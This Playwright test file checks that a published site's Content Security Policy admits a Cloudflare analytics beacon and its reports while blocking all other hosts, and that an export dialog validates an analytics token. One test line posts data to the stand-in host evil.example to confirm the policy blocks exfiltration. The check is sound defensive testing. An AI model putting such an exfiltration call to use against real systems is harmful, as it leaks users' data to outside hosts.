import { readFile } from "node:fs/promises";
import { expect, test, type Page } from "@playwright/test";
import { unzipSync } from "fflate";
import { exampleProject } from "@avc/schema";
import { buildSite } from "@avc/publisher";

const frame = (page: Page) => page.frameLocator("iframe[title=Canvas]");
const TOKEN = "0123456789abcdef0123456789abcdef";
const SITE = "https://published.test";

test("a published site loads the analytics beacon under its own CSP, can report to Cloudflare, and still blocks every other host", async ({ page }) => {
  const r = await buildSite(exampleProject, [], { baseUrl: SITE, analytics: { token: TOKEN } });
  if (!r.ok) throw new Error(r.errors.join());
  const headers: Record<string, string> = {};
  for (const line of Buffer.from(r.files["_headers"]!).toString().split(/\n\n/)[0]!.split("\n").slice(1)) { const i = line.indexOf(":"); if (i > 0) headers[line.slice(0, i).trim()] = line.slice(i + 1).trim(); }
  const violations: string[] = [];
  await page.exposeFunction("__v", (v: string) => violations.push(v));
  await page.addInitScript(() => document.addEventListener("securitypolicyviolation", (e) => (window as any).__v(`${e.violatedDirective}|${e.blockedURI}`)));
  await page.route(`${SITE}/**`, (route) => route.fulfill({ status: 200, headers, contentType: "text/html; charset=utf-8", body: Buffer.from(r.files["index.html"]!) }));

  // a stand-in beacon that reports home the way the real one does, so the CSP is genuinely exercised
  const reports: string[] = [];
  await page.route("https://static.cloudflareinsights.com/beacon.min.js", (route) => route.fulfill({ contentType: "text/javascript", body: `fetch("https://cloudflareinsights.com/cdn-cgi/rum", { method: "POST", body: "{}" }).catch(() => {}); window.__beacon = JSON.parse(document.currentScript.dataset.cfBeacon).token;` }));
  await page.route("https://cloudflareinsights.com/**", (route) => { reports.push(route.request().url()); return route.fulfill({ status: 204, headers: { "access-control-allow-origin": "*" } }); });

  await page.goto(SITE + "/");
  await expect.poll(() => page.evaluate(() => (window as any).__beacon)).toBe(TOKEN); // the script ran, with the right token
  await expect.poll(() => reports.length).toBeGreaterThan(0); // and its report was allowed through
  expect(violations).toEqual([]);

  // nothing else is reachable
  const blocked = await page.evaluate(() => fetch("https://evil.example/collect", { method: "POST", body: "x" }).then(() => "sent", () => "blocked"));
  expect(blocked).toBe("blocked");
  await expect.poll(() => violations.some((v) => v.startsWith("connect-src|https://evil.example"))).toBe(true);
});

test("export dialog: off by default; turning it on needs a valid token; the zip then carries the beacon", async ({ page }) => {
  await page.goto("/");
  await expect(frame(page).locator("h1")).toBeVisible();
  await page.getByRole("button", { name: "Export", exact: true }).click();
  const s = page.getByTestId("analytics-section");
  await expect(s.getByLabel("Analytics token")).toHaveCount(0);
  await s.getByRole("button", { name: "How?" }).click();
  await expect(page.getByTestId("analytics-help")).toContainText("Web Analytics");

  await s.getByLabel("Count visits (Cloudflare Web Analytics)").check();
  await expect(s).toContainText("Paste your token");
  await s.getByLabel("Analytics token").fill("not-a-token");
  await expect(s.getByRole("alert")).toContainText("exactly 32");

  // while the token is invalid, the export has no beacon
  const [d0] = await Promise.all([page.waitForEvent("download"), page.getByRole("button", { name: /Download \.zip/ }).click()]);
  const f0 = unzipSync(new Uint8Array(await readFile((await d0.path())!)));
  expect(new TextDecoder().decode(f0["index.html"])).not.toContain("cloudflareinsights");

  await s.getByLabel("Analytics token").fill(TOKEN);
  await expect(s.getByRole("alert")).toHaveCount(0);
  const [d1] = await Promise.all([page.waitForEvent("download"), page.getByRole("button", { name: /Download \.zip/ }).click()]);
  const f1 = unzipSync(new Uint8Array(await readFile((await d1.path())!)));
  const html = new TextDecoder().decode(f1["index.html"]);
  expect(html).toContain(`"token": "${TOKEN}"`);
  expect(new TextDecoder().decode(f1["_headers"])).toContain("https://static.cloudflareinsights.com");

  // the choice is remembered (it isn't secret)
  await page.reload();
  await expect(frame(page).locator("h1")).toBeVisible();
  await page.getByRole("button", { name: "Export", exact: true }).click();
  await expect(page.getByLabel("Analytics token")).toHaveValue(TOKEN);
});
